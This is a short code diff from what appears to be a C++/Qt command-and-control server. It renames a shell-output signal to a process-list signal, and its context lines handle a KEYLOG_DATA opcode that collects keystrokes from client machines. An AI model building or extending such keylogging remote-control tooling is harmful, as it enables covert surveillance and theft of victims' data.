@@ -175,7 +175,7 @@ void Server::processPacketBuffer(ClientContext& client) {
                         offset += nlen;
                     }
                 }
-                emit shellOutputReceived(QString::fromStdString(client.socket.getIp()), output);
+                emit processListReceived(QString::fromStdString(client.socket.getIp()), output);
             }
         } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_DATA)) {
             emit keylogReceived(QString::fromStdString(client.socket.getIp()), 
